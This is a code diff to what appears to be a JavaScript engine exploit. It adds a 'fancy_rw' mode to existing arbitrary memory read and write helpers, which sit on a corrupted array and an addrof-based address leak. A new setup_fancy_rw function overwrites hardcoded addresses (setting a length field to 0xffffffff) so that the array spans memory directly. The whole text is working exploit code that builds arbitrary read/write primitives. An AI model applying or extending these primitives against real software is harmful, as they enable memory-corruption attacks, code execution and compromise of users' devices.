@@ -1,6 +1,7 @@
 var shit_status = 0x144444;
 var global_sptr_addy = 0;
 var VECTOR_OFFSET = 0x10;
+var fancy_rw = false;
 var sptr_size = 0;
 var sptr_len = 0;
 
@@ -8,6 +9,10 @@ var sptr_len = 0;
  *  read uint8_t
  */
 function read_u8(addy) {
+	if (fancy_rw) {
+		return parent[addy];
+	}
+
 	u8x4 = u32_to_u8x4(addy);
 
 	/*
@@ -34,6 +39,10 @@ function read_u8(addy) {
  *  read uint16_t
  */
 function read_u16(addy) {
+	if (fancy_rw) {
+		return u8x2_to_u16([parent[addy], parent[addy + 1]]);
+	}
+
 	u8x4 = u32_to_u8x4(addy);
 
 	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
@@ -49,6 +58,10 @@ function read_u16(addy) {
  *  read uint32_t
  */
 function read_u32(addy) {
+	if (fancy_rw) {
+		return u8x4_to_u32([parent[addy], parent[addy + 1], parent[addy + 2], parent[addy + 3]]);
+	}
+
 	u8x4 = u32_to_u8x4(addy);
 
 	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
@@ -110,6 +123,11 @@ function fast_write_buf(addy, buf) {
  *  write uint8_t
  */
 function write_u8(addy, what) {
+	if (fancy_rw) {
+		parent[addy] = what;
+		return;
+	}
+
 	u8x4 = u32_to_u8x4(addy);
 
 	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
@@ -124,6 +142,13 @@ function write_u8(addy, what) {
  *  write uint16_t
  */
 function write_u16(addy, what) {
+	if (fancy_rw) {
+		parent[addy] = what & 0xff;
+		parent[addy + 1] = (what >> 8) & 0xff;
+		
+		return;
+	}
+
 	u8x4 = u32_to_u8x4(addy);
 
 	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
@@ -140,6 +165,15 @@ function write_u16(addy, what) {
  *  write uint32_t
  */
 function write_u32(addy, what) {
+	if (fancy_rw) {
+		parent[addy] = what & 0xff;
+		parent[addy + 1] = (what >> 8) & 0xff;
+		parent[addy + 2] = (what >> 16) & 0xff;
+		parent[addy + 3] = (what >> 24) & 0xff;
+
+		return;
+	}
+
 	u8x4 = u32_to_u8x4(addy);
 
 	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
@@ -267,4 +301,13 @@ function leak_vec(arr) {
 	var addy = addrof(arr);
 	printf("%x\n", addy);
 	return read_u32(addy + VECTOR_OFFSET);
+}
+
+function setup_fancy_rw() {
+	write_u32(0x422294, 0xffffffff);
+	write_u32(0x422290, 0x0);
+
+	fancy_rw = true;
+
+	printf("%08x\n", u8x4_to_u32([parent[0x5000], parent[0x5001], parent[0x5002], parent[0x5003]]));
 }
